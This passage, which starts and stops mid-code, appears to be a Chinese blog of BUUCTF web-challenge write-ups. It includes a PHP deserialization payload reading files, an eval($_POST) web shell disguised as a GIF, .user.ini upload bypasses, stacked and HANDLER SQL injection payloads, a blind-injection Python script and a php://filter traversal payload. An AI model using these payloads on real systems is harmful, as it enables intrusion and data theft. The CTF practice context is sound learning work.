class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>&#123;<span class="hljs-string">&#x27;str&#x27;</span>&#125;)) &#123;<br><br>    <span class="hljs-variable">$str</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;str&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_valid</span>(<span class="hljs-variable">$str</span>)) &#123;<br>        <span class="hljs-variable">$obj</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$str</span>);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>
<ol start="2">
<li>这里利用writes上传文件或者利用read读取文件，但是使用write是content被强制赋值为空，使用read被强制转换为write。如何破局？</li>
</ol>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs tex">代码审计：<br>在最开始的<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>destruct函数中，op使用的强类型比较，而在真正处理的时候，op使用的是弱类型比较，我们是需要让op等于数值2，就不会进入强类型比较，可实现文件读取。<br><br><span class="hljs-comment">%__destruct</span><br>function <span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>destruct() &#123;<br>        if(<span class="hljs-built_in">$</span>this-&gt;op === &quot;2&quot;)<br>            <span class="hljs-built_in">$</span>this-&gt;op = &quot;1&quot;;<br>        <span class="hljs-built_in">$</span>this-&gt;content = &quot;&quot;;<br>        <span class="hljs-built_in">$</span>this-&gt;process();<br>    &#125;<br><span class="hljs-comment">%process</span><br>public function process() &#123;<br>        if(<span class="hljs-built_in">$</span>this-&gt;op == &quot;1&quot;) &#123;<br>            <span class="hljs-built_in">$</span>this-&gt;write();<br>        &#125; else if(<span class="hljs-built_in">$</span>this-&gt;op == &quot;2&quot;) &#123;<br>            <span class="hljs-built_in">$</span>res = <span class="hljs-built_in">$</span>this-&gt;read();<br>            <span class="hljs-built_in">$</span>this-&gt;output(<span class="hljs-built_in">$</span>res);<br>        &#125; else &#123;<br>            <span class="hljs-built_in">$</span>this-&gt;output(&quot;Bad Hacker!&quot;);<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure>
<ol start="3">
<li>这里传入反序列化字符串时，还需要绕过isvalid()函数：</li>
</ol>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs tex"><span class="hljs-comment">%isvalid，这里使用protect属性，属性名会变为%00+*+%00+属性名，%00ord值为0，不在isvalid的范围内</span><br>protected <span class="hljs-built_in">$</span>op;<br>protected <span class="hljs-built_in">$</span>filename;<br>protected <span class="hljs-built_in">$</span>content;<br><br>function is<span class="hljs-built_in">_</span>valid(<span class="hljs-built_in">$</span>s) &#123;<br>    for(<span class="hljs-built_in">$</span>i = 0; <span class="hljs-built_in">$</span>i &lt; strlen(<span class="hljs-built_in">$</span>s); <span class="hljs-built_in">$</span>i++)<br>        if(!(ord(<span class="hljs-built_in">$</span>s[<span class="hljs-built_in">$</span>i]) &gt;= 32 <span class="hljs-built_in">&amp;</span><span class="hljs-built_in">&amp;</span> ord(<span class="hljs-built_in">$</span>s[<span class="hljs-built_in">$</span>i]) &lt;= 125))<br>            return false;<br>    return true;<br>&#125;<br><br><span class="hljs-comment">%方法一</span><br>利用大写S采用的16进制,使用<span class="hljs-keyword">\0</span>0代替<span class="hljs-comment">%00</span><br><br><span class="hljs-comment">%方法二</span><br>php7.1+版本对属性类型不敏感，本地序列化的时候将属性改为public进行绕过即可<br></code></pre></td></tr></table></figure>
<ol start="4">
<li>创建payload:</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#方法一</span><br><span class="hljs-meta">&lt;?php</span>  <br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$op</span>=<span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$filename</span>=<span class="hljs-string">&quot;/etc/passwd&quot;</span>;  <span class="hljs-comment">// 最后需要手动修改passwd为小写</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$content</span>;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileHandler</span>();<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-meta">?&gt;</span>  <br>e.g.<br>O:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;FileHandler&quot;</span>:<span class="hljs-number">3</span>:&#123;S:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;\00*\00op&quot;</span>;i:<span class="hljs-number">2</span>;S:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;\00*\00filename&quot;</span>;S:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;flag.php&quot;</span>;S:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;\00*\00content&quot;</span>;N;&#125;<br>    <br>    <br><span class="hljs-comment">#方法二</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$op</span>=<span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>=<span class="hljs-string">&quot;flag.php&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$content</span>=<span class="hljs-string">&quot;&quot;</span>;<br><br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileHandler</span>();<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-meta">?&gt;</span><br><br><br><br></code></pre></td></tr></table></figure>
<h2 id="GXYCTF2019-BabyUpload">[GXYCTF2019]BabyUpload</h2>
<ol>
<li>首先上传一句话木马，发现后缀不能含有<code>ph</code>，上传jpg文件，报错如下：</li>
</ol>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1746610738341.png" srcset="/img/loading.gif" lazyload alt="1746610738341"></p>
<ol start="2">
<li>过滤了php标签，修改格式如下，上传成功：</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">GIF89</span>a? <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;php&quot;</span>&gt;</span><span class="language-javascript"> <span class="hljs-built_in">eval</span>($_POST[<span class="hljs-number">1</span>]); </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span> <br></code></pre></td></tr></table></figure>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1746611356480.png" srcset="/img/loading.gif" lazyload alt="1746611356480"></p>
<ol start="3">
<li>上传配置文件<code>.htaccess</code>,内容如下：</li>
</ol>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1746611432004.png" srcset="/img/loading.gif" lazyload alt="1746611432004"></p>
<ol start="4">
<li>修改文件类型为image/jpeg，成功上传:</li>
</ol>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1746611466519.png" srcset="/img/loading.gif" lazyload alt="1746611466519"></p>
<ol start="5">
<li>蚁剑连接：</li>
</ol>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1746615544101.png" srcset="/img/loading.gif" lazyload alt="1746615544101"></p>
<h2 id="SUCTF-2019-CheckIn">[SUCTF 2019]CheckIn</h2>
<ol>
<li>按照上述方法解题，在上传<code>.htaccess</code>配置文件时，会提示<code>exif_imagetype:not image!</code>，我们首先尝试在配置文件中添加图片头<code>GIF89a?</code>，内容失效，无法使用蚁剑连接。</li>
<li>这里使用另一个php配置文件<code>.user.ini</code>，内容如下：</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># .xxxx.ini文件是配置当前目录以及当前子目录的规则配置的文件，文件的中的配置会覆盖掉当前php.ini中的规则，是当前用户的配置文件</span><br><span class="hljs-comment"># 除了主 php.ini 之外，PHP还会在每个目录下扫描 INI 文件，从被执行的 PHP文件所在目录开始一直上升到 web 根目录（$_SERVER[&#x27;DOCUMENT_ROOT&#x27;] 所指定的）。如果被执行的 PHP文件在 web 根目录之外，则只扫描该目录。</span><br><span class="hljs-comment"># 如果是 Apache 服务器，则可以利用 .htaccess 文件，作用和 .INI 一样，只是风格上有些不一样</span><br><br>GIF89a?                        <span class="hljs-comment">#绕过检测   </span><br>auto_append_file=<span class="hljs-number">1</span>.jpg<br>    <br><span class="hljs-comment">#auto_prepend_file=文件名       在页面顶部预加载文件</span><br><span class="hljs-comment">#auto_append_file=文件名        在页面的底部预加载文件</span><br></code></pre></td></tr></table></figure>
<ol start="3">
<li>蚁剑连接，木马文件应是<code>index.php</code>，利用<code>.user.ini</code>添加了恶意代码：</li>
</ol>
<h2 id="GXYCTF2019-BabySQli">[GXYCTF2019]BabySQli</h2>
<ol>
<li>首先判断注入类型：字符型</li>
</ol>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1746712552974.png" srcset="/img/loading.gif" lazyload alt="1746712552974"></p>
<ol start="2">
<li>判断字段数：order被过滤，采用大小写绕过。</li>
</ol>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1746712599826.png" srcset="/img/loading.gif" lazyload alt="1746712599826"></p>
<ol start="3">
<li>字段数经过尝试为3</li>
</ol>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1746712664171.png" srcset="/img/loading.gif" lazyload alt="1746712664171"></p>
<ol start="4">
<li>回显的时候有一段编码，先base32解密，再base64解密：</li>
</ol>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1746712728746.png" srcset="/img/loading.gif" lazyload alt="1746712728746"></p>
<p>解码内容如下：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;$name&#x27;</span><br></code></pre></td></tr></table></figure>
<ol start="5">
<li>
<p>阅读源码<code>search.php</code>：经过sql查询后的结果符合两个条件，第二个结果为username，第三个结果为我们传入密码的md5值。</p>
<p><strong>我们通过联合注入构造sql查询结果。</strong></p>
</li>
</ol>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1746712887851.png" srcset="/img/loading.gif" lazyload alt="1746712887851"></p>
<ol start="6">
<li>构造arr[1]的结果（第二个）为admin。</li>
</ol>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1746713166148.png" srcset="/img/loading.gif" lazyload alt="1746713166148"></p>
<ol start="7">
<li>接着构造arr[2]的结果（第三个），构造我们需要的password,传入password为123的md5值。</li>
</ol>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1746713281988.png" srcset="/img/loading.gif" lazyload alt="1746713281988"></p>
<h2 id="GYCTF2020-Blacklist">[GYCTF2020]Blacklist</h2>
<p>与强网杯随便注题目相似。</p>
<ol>
<li>字符型注入，字段数为2</li>
</ol>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1746758328743.png" srcset="/img/loading.gif" lazyload alt="1746758328743"></p>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1746758362695.png" srcset="/img/loading.gif" lazyload alt="1746758362695"></p>
<ol start="2">
<li>尝试联合注入时发现关键词过滤：</li>
</ol>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1746758413957.png" srcset="/img/loading.gif" lazyload alt="1746758413957"></p>
<ol start="3">
<li>使用show代替select:</li>
</ol>
<p>表：</p>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1746758473096.png" srcset="/img/loading.gif" lazyload alt="1746758473096"></p>
<p>列：</p>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1746758539083.png" srcset="/img/loading.gif" lazyload alt="1746758539083"></p>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1746758808355.png" srcset="/img/loading.gif" lazyload alt="1746758808355"></p>
<ol start="4">
<li>输入1显示的是word表的内容，尝试将FlagHere改为word表：</li>
</ol>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;;rename table words to words1;rename table FlagHere to words;Alter table words add id int unsigned not Null auto_increment primary key;Alter table words change flag data varchar(100);#</span><br></code></pre></td></tr></table></figure>
<p>过滤了关键字alter，set，强网杯中的方法一和方法二均不能使用，尝试方法三</p>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1746758964323.png" srcset="/img/loading.gif" lazyload alt="1746758964323"></p>
<ol start="5">
<li>使用handler：</li>
</ol>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;;handler FlagHere open as `a`;handler `a` read next;#</span><br></code></pre></td></tr></table></figure>
<p>通过<strong>HANDLER tbl_name READ FIRST</strong>获取句柄的第一行，通过<strong>READ NEXT</strong>依次获取其它行。最后一行执行之后再执行NEXT会返回一个空的结果。</p>
<h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World">[CISCN2019 华北赛区 Day2 Web1]Hack World</h2>
<p>根据输入id=1或2的结果不同，判断为布尔盲注。</p>
<ol>
<li>抓包查看数据如何传输：</li>
</ol>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1746802838612.png" srcset="/img/loading.gif" lazyload alt="1746802838612"></p>
<ol start="2">
<li>编写布尔盲注脚本：（二分，左闭右闭区间写法）</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://f7431753-b186-4e0e-8446-150cd21bbaaf.node5.buuoj.cn:81/&quot;</span><br>flag = <span class="hljs-string">&quot;&quot;</span><br><br>i = <span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    i = i+<span class="hljs-number">1</span><br>    left = <span class="hljs-number">32</span><br>    right = <span class="hljs-number">127</span><br>    <span class="hljs-keyword">while</span> right &gt; left:<br>        mid = (left + right) // <span class="hljs-number">2</span><br>        payload = <span class="hljs-string">f&quot;if(ascii(substr((select(flag)from(flag)),<span class="hljs-subst">&#123;i&#125;</span>,1))&gt;<span class="hljs-subst">&#123;mid&#125;</span>,1,2)&quot;</span><br>        data = &#123;<span class="hljs-string">&quot;id&quot;</span>:payload&#125;<br>        res = requests.post(url=url,data=data)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Hello&quot;</span> <span class="hljs-keyword">in</span> res.text:<br>            left = mid + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            right = mid<br>        <br>    <span class="hljs-keyword">if</span> left == <span class="hljs-number">32</span>:    <span class="hljs-comment">#空格表示结束</span><br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        flag += <span class="hljs-built_in">chr</span>(left)<br>        <span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure>
<h2 id="BSidesCF-2020-Had-a-bad-day">[BSidesCF 2020]Had a bad day</h2>
<ol>
<li>点击任何一个选项，url如下，可能为文件包含：</li>
</ol>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1746949218055.png" srcset="/img/loading.gif" lazyload alt="1746949218055"></p>
<ol start="2">
<li>尝试使用伪协议读取源码：自动拼接php</li>
</ol>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1746949317656.png" srcset="/img/loading.gif" lazyload alt="1746949317656"></p>
<ol start="3">
<li>去掉php进行读取：</li>
</ol>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1746949395330.png" srcset="/img/loading.gif" lazyload alt="1746949395330"></p>
<ol start="4">
<li>源码内容如下：</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>	<span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;category&#x27;</span>];<br>	<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$file</span>))<br>	&#123;<br>		<span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">strpos</span>( <span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;woofers&quot;</span> ) !==  <span class="hljs-literal">false</span> || <span class="hljs-title function_ invoke__">strpos</span>( <span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;meowers&quot;</span> ) !==  <span class="hljs-literal">false</span> || <span class="hljs-title function_ invoke__">strpos</span>( <span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;index&quot;</span>))&#123;<br>			<span class="hljs-keyword">include</span> (<span class="hljs-variable">$file</span> . <span class="hljs-string">&#x27;.php&#x27;</span>);<br>		&#125;<br>		<span class="hljs-keyword">else</span>&#123;<br>			<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Sorry, we currently only support woofers and meowers.&quot;</span>;<br>			&#125;<br>		&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<ul>
<li>strpos函数：</li>
</ul>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1746949631180.png" srcset="/img/loading.gif" lazyload alt="1746949631180"></p>
<ul>
<li>可以使用目录穿越（逐层寻找）的方法绕过strpos函数的限制：</li>
</ul>
<p>利用下列的payload读取flag.php</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tex">?category=php://filter/read=convert.base64-encode/resource=woofers/../flag<br></code></pre></td></tr></table></figure>
<h2 id="网鼎杯-2018-Fakebook">[网鼎杯 2018]Fakebook</h2>
<ol>
<li>注册一个账号登录后，url如下：可能存在sql注入</li>
</ol>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1746952859680.png" srcset="/img/loading.gif" lazyload alt="1746952859680"></p>
<ol start="2">
<li>判断是否存在sql注入以及注入类型：数字型</li>
</ol>
<ul>
<li>————————————————————————————————————————————————</li>
</ul>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1746953017538.png" srcset="/img/loading.gif" lazyload alt="1746953017538"></p>
<ul>
<li>————————————————————————————————————————————————</li>
</ul>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1746952976916.png" srcset="/img/loading.gif" lazyload alt="1746952976916"></p>
<ol start="3">
<li>字段数判断：字段数为4</li>
</ol>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1746953164634.png" srcset="/img/loading.gif" lazyload alt="1746953164634"></p>
<ol start="4">
<li>查看回显位置：2的位置</li>
</ol>
<ul>
<li>存在过滤：</li>
</ul>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1746953217617.png" srcset="/img/loading.gif" lazyload alt="1746953217617"></p>
<ul>
<li>经过尝试，union与select均正常，过滤组合<code>union select</code>，使用<code>union/**/select</code>替换：</li>
</ul>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1746953307489.png" srcset="/img/loading.gif" lazyload alt="1746953307489"></p>
<ol start="5">
<li>联合注入的一系列操作：</li>
</ol>
<ul>
<li>爆库：</li>
</ul>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1746953368672.png" srcset="/img/loading.gif" lazyload alt="1746953368672"></p>
<ul>
<li>爆表：</li>
</ul>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1746953512860.png" srcset="/img/loading.gif" lazyload alt="1746953512860"></p>
<ul>
<li>爆列：</li>
</ul>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1746953569239.png" srcset="/img/loading.gif" lazyload alt="1746953569239"></p>
<ul>
<li>查看内容：data中的内容与我们注册时所填内容一致</li>
</ul>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1746953736986.png" srcset="/img/loading.gif" lazyload alt="1746953736986"></p>
<ol start="6">
<li>使用dirsearch扫描目录时发现robots.txt文件，进一步发现<code>user.php.bak</code>备份文件，内容如下：</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserInfo</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$blog</span> = <span class="hljs-string">&quot;&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$age</span>, <span class="hljs-variable">$blog</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;age = (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$age</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;blog = <span class="hljs-variable">$blog</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>();<br><br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);<br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br>        <span class="hljs-variable">$output</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br>        <span class="hljs-variable">$httpCode</span> = <span class="hljs-title function_ invoke__">curl_getinfo</span>(<span class="hljs-variable">$ch</span>, CURLINFO_HTTP_CODE);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$httpCode</span> == <span class="hljs-number">404</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">404</span>;<br>        &#125;<br>        <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$output</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getBlogContents</span> (<span class="hljs-params"></span>)  //通过传入的<span class="hljs-title">blog</span>地址读取文件内容</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$this</span>-&gt;blog);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isValidBlog</span> (<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$blog</span> = <span class="hljs-variable language_">$this</span>-&gt;blog;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span 